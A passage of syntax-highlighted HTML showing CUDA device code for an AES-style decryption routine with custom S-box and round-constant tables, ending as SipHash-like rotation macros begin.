class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>,</span><br><span class="line"><span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>,</span><br><span class="line"><span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>,</span><br><span class="line"><span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>,</span><br><span class="line"><span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> S_user[<span class="number">256</span>]&#123; </span><br><span class="line"><span class="number">0x3f</span>, <span class="number">0x1e</span>, <span class="number">0xfc</span>, <span class="number">0x3d</span>, <span class="number">0x68</span>, <span class="number">0x51</span>, <span class="number">0xf0</span>, <span class="number">0x20</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0x54</span>, <span class="number">0x6e</span>, <span class="number">0xfb</span>, <span class="number">0x42</span>,</span><br><span class="line"><span class="number">0x29</span>, <span class="number">0xe8</span>, <span class="number">0x23</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa2</span>, <span class="number">0x3a</span>, <span class="number">0xc0</span>, <span class="number">0xd4</span>, <span class="number">0xba</span>, <span class="number">0xb5</span>, <span class="number">0x84</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x5c</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xf2</span>, <span class="number">0x22</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x0d</span>, <span class="number">0x8a</span>, <span class="number">0x89</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0xef</span>, <span class="number">0x67</span>,</span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0xbd</span>, <span class="number">0xd0</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xb4</span>, <span class="number">0x55</span>, <span class="number">0xc5</span>, <span class="number">0xc8</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0xd8</span>, <span class="number">0x01</span>, <span class="number">0x5a</span>, <span class="number">0x2e</span>, <span class="number">0xed</span>, <span class="number">0x91</span>, <span class="number">0xff</span>, <span class="number">0x15</span>, <span class="number">0x6c</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x24</span>, <span class="number">0x72</span>, <span class="number">0x1a</span>, <span class="number">0x75</span>, <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x56</span>, <span class="number">0xbf</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xc7</span>, <span class="number">0x95</span>, <span class="number">0x05</span>, <span class="number">0xb6</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0xb3</span>, <span class="number">0x10</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x43</span>, <span class="number">0xbb</span>,</span><br><span class="line"><span class="number">0x62</span>, <span class="number">0x7c</span>, <span class="number">0x7b</span>, <span class="number">0xa3</span>, <span class="number">0xbe</span>, <span class="number">0xd9</span>, <span class="number">0xbc</span>, <span class="number">0xdc</span>, <span class="number">0xc9</span>, <span class="number">0x8f</span>, <span class="number">0xa4</span>, <span class="number">0xe3</span>, <span class="number">0xe7</span>, <span class="number">0x17</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0xae</span>, <span class="number">0x83</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0x27</span>, <span class="number">0x4a</span>, <span class="number">0x21</span>, <span class="number">0x71</span>, <span class="number">0x2c</span>, <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xaf</span>, <span class="number">0x44</span>,</span><br><span class="line"><span class="number">0x85</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>, <span class="number">0xf4</span>, <span class="number">0xfd</span>, <span class="number">0x3c</span>, <span class="number">0xf1</span>, <span class="number">0x45</span>, <span class="number">0x1f</span>, <span class="number">0x5b</span>, <span class="number">0xb8</span>, <span class="number">0xa1</span>, <span class="number">0xc4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0x09</span>, <span class="number">0xea</span>, <span class="number">0xee</span>, <span class="number">0x0c</span>, <span class="number">0xd6</span>, <span class="number">0x61</span>, <span class="number">0xc6</span>, <span class="number">0xaa</span>, <span class="number">0xb0</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xb9</span>, <span class="number">0x7f</span>, <span class="number">0xec</span>, <span class="number">0x94</span>,</span><br><span class="line"><span class="number">0xce</span>, <span class="number">0xa9</span>, <span class="number">0x97</span>, <span class="number">0x3b</span>, <span class="number">0xda</span>, <span class="number">0x8e</span>, <span class="number">0xe5</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0xad</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0x40</span>, <span class="number">0xb2</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0xcb</span>, <span class="number">0xb7</span>, <span class="number">0x1c</span>, <span class="number">0x7a</span>, <span class="number">0xf6</span>, <span class="number">0x87</span>, <span class="number">0xcd</span>, <span class="number">0x4f</span>, <span class="number">0x9f</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x0f</span>, <span class="number">0x6a</span>, <span class="number">0xa8</span>, <span class="number">0xde</span>, <span class="number">0xc3</span>,</span><br><span class="line"><span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0xfa</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x90</span>, <span class="number">0xdf</span>, <span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xe0</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xe2</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x6b</span>, <span class="number">0x0b</span>, <span class="number">0x3e</span>, <span class="number">0x1d</span>, <span class="number">0xe1</span>, <span class="number">0x58</span>, <span class="number">0x38</span>, <span class="number">0xc2</span>, <span class="number">0x78</span>, <span class="number">0x0e</span>, <span class="number">0x59</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0x88</span>, <span class="number">0xdd</span>, <span class="number">0x9b</span>, <span class="number">0xd2</span>, <span class="number">0x19</span>, <span class="number">0x7e</span>, <span class="number">0xf9</span>, <span class="number">0xdb</span>, <span class="number">0xfe</span>, <span class="number">0x60</span>, <span class="number">0x13</span>, <span class="number">0x4c</span>, <span class="number">0xcc</span>, <span class="number">0xf3</span>, <span class="number">0xa5</span>, <span class="number">0x14</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x96</span>, <span class="number">0x80</span>, <span class="number">0xe6</span>, <span class="number">0x9a</span>, <span class="number">0xf5</span>, <span class="number">0x9e</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x0a</span>, <span class="number">0xcf</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x06</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> rcon_user[<span class="number">10</span>]&#123;</span><br><span class="line"> <span class="number">0x01000000UL</span>, <span class="number">0x02000000UL</span>, <span class="number">0x04000000UL</span>, <span class="number">0x08000000UL</span>, <span class="number">0x10000000UL</span>,</span><br><span class="line"> <span class="number">0x20000000UL</span>, <span class="number">0x40000000UL</span>, <span class="number">0x80000000UL</span>, <span class="number">0x1B000000UL</span>, <span class="number">0x36000000UL</span> </span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD32H(x, y) do &#123; \</span></span><br><span class="line"><span class="meta">    uint32_t _temp = 0; \</span></span><br><span class="line"><span class="meta">    _temp  = ((uint32_t)((y)[0] &amp; 0xFF) &lt;&lt; 24); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[1] &amp; 0xFF) &lt;&lt; 16); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[2] &amp; 0xFF) &lt;&lt; 8); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[3] &amp; 0xFF)); \</span></span><br><span class="line"><span class="meta">    (x) = _temp; \</span></span><br><span class="line"><span class="meta">&#125; while(0) </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STORE32H(x, y) \</span></span><br><span class="line"><span class="meta">   (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \</span></span><br><span class="line"><span class="meta">       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROF32(x, n)  (((x) <span class="string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint32_t</span> <span class="title">MixWord</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">const</span> <span class="type">uint8_t</span>* LocalS)</span> </span>&#123;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> word;</span><br><span class="line"><span class="type">uint8_t</span> bytes[<span class="number">4</span>];</span><br><span class="line">&#125; in, out;</span><br><span class="line"></span><br><span class="line">in.word = x;</span><br><span class="line"></span><br><span class="line">out.bytes[<span class="number">0</span>] = LocalS[in.bytes[<span class="number">1</span>]];  <span class="comment">// BYTE(x, 1)</span></span><br><span class="line">out.bytes[<span class="number">1</span>] = LocalS[in.bytes[<span class="number">0</span>]];  <span class="comment">// BYTE(x, 0)</span></span><br><span class="line">out.bytes[<span class="number">2</span>] = LocalS[in.bytes[<span class="number">3</span>]];  <span class="comment">// BYTE(x, 3)</span></span><br><span class="line">out.bytes[<span class="number">3</span>] = LocalS[in.bytes[<span class="number">2</span>]];  <span class="comment">// BYTE(x, 2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ((<span class="type">uint32_t</span>)out.bytes[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">keyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> * key, <span class="type">uint32_t</span> keyLen, <span class="type">void</span> * aesKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> eK[<span class="number">44</span>], dK[<span class="number">44</span>];</span><br><span class="line"><span class="type">int</span> Nr;</span><br><span class="line">&#125;AesKey;</span><br><span class="line">AesKey* p_aesKey = (AesKey*)aesKey;</span><br><span class="line"><span class="type">uint32_t</span>* w = p_aesKey-&gt;eK;</span><br><span class="line"><span class="type">uint32_t</span>* v = p_aesKey-&gt;dK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">LOAD32H</span>(w[i], key + <span class="number">4</span> * i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ <span class="built_in">MIX</span>(w[<span class="number">3</span>]) ^ rcon[i];</span><br><span class="line">w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">w += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w = p_aesKey-&gt;eK + <span class="number">44</span> - <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">11</span>; ++j) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">v[i] = w[i];</span><br><span class="line">&#125;</span><br><span class="line">w -= <span class="number">4</span>;</span><br><span class="line">v += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">loadStateArray</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint8_t</span>* in)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[j][i] = *in++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">storeStateArray</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">uint8_t</span>* out)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">*out++ = state[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">addRoundKey</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> k[<span class="number">4</span>][<span class="number">4</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">k[i][j] = (<span class="type">uint8_t</span>)<span class="built_in">BYTE</span>(key[j], <span class="number">3</span> - i);</span><br><span class="line">state[i][j] ^= k[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invSubBytes</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> LocalInvS[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">LocalInvS[i] = inv_S[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[i][j] = LocalInvS[state[i][j]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invShiftRows</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">temp[i][j] = state[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">state[<span class="number">0</span>][<span class="number">0</span>] = temp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">1</span>] = temp[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">2</span>] = temp[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">0</span>][<span class="number">3</span>] = temp[<span class="number">0</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">1</span>][<span class="number">0</span>] = temp[<span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">1</span>] = temp[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">2</span>] = temp[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>][<span class="number">3</span>] = temp[<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">2</span>][<span class="number">0</span>] = temp[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">1</span>] = temp[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">2</span>] = temp[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line">state[<span class="number">2</span>][<span class="number">3</span>] = temp[<span class="number">2</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">state[<span class="number">3</span>][<span class="number">0</span>] = temp[<span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">1</span>] = temp[<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">2</span>] = temp[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">state[<span class="number">3</span>][<span class="number">3</span>] = temp[<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint8_t</span> <span class="title">GMul</span><span class="params">(<span class="type">uint8_t</span> u, <span class="type">uint8_t</span> v)</span> </span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (u &amp; <span class="number">0x01</span>) &#123;</span><br><span class="line">p ^= v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = (v &amp; <span class="number">0x80</span>);</span><br><span class="line">v &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">v ^= <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">invMixColumns</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123; &#123;<span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>&#125;,</span><br><span class="line">   &#123;<span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>&#125; &#125;;</span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">tmp[i][j] = state[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[i][j] =</span><br><span class="line"><span class="built_in">GMul</span>(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j])</span><br><span class="line">^ <span class="built_in">GMul</span>(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span>* ct, <span class="type">uint8_t</span>* pt, <span class="type">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> eK[<span class="number">44</span>]&#123;&#125;, dK[<span class="number">44</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> Nr;</span><br><span class="line">&#125;AesKey;</span><br><span class="line"></span><br><span class="line">AesKey aesKey;</span><br><span class="line"><span class="type">uint8_t</span>* pos = pt;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">keyExpansion</span>(key, <span class="number">16</span>, &amp;aesKey);</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span>* rk = aesKey.dK;</span><br><span class="line"></span><br><span class="line"><span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rk += <span class="number">4</span>;</span><br><span class="line"><span class="built_in">invShiftRows</span>(state);</span><br><span class="line"><span class="built_in">invSubBytes</span>(state);</span><br><span class="line"><span class="comment">// 解密同样交换addRoundKey和invMixColumns的调用顺序</span></span><br><span class="line"><span class="built_in">invMixColumns</span>(state);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">invSubBytes</span>(state);</span><br><span class="line"><span class="built_in">invShiftRows</span>(state);</span><br><span class="line"><span class="built_in">addRoundKey</span>(state, rk + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _le64toh(x) ((uint64_t)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE(x, b) (uint64_t)( ((x) <span class="string">&lt;&lt; (b)) | ( (x) &gt;</span>&gt; (64 - (b))) )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_ROUND(a,b,c,d,s,t)\</span></span><br><span class="line"><span class="meta">a += b; c += d;\</span></span><br><span class="line"><span 